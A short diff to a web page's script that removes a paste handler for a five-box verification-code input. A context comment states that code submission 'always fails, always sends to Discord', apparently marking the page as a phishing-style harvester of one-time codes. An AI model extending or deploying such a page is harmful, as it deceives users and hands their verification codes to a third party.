@@ -444,19 +444,6 @@ codeInput.addEventListener('input', function () {
                         document.getElementById('btnVerificar').disabled = true;
                     }
                 });
-                box.addEventListener('paste', function (e) {
-                    e.preventDefault();
-                    var text = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 5);
-                    boxes.forEach(function (b, i) {
-                        b.value = text[i] || '';
-                        if (b.value) b.classList.add('filled'); else b.classList.remove('filled');
-                    });
-                    var all = text.length === 5;
-                    document.getElementById('btnVerificar').disabled = !all;
-                    if (all) boxes[4].focus();
-                });
-            });
-        });
 
         // ── Submit code — always fails, always sends to Discord ──
         async function submitCode() {
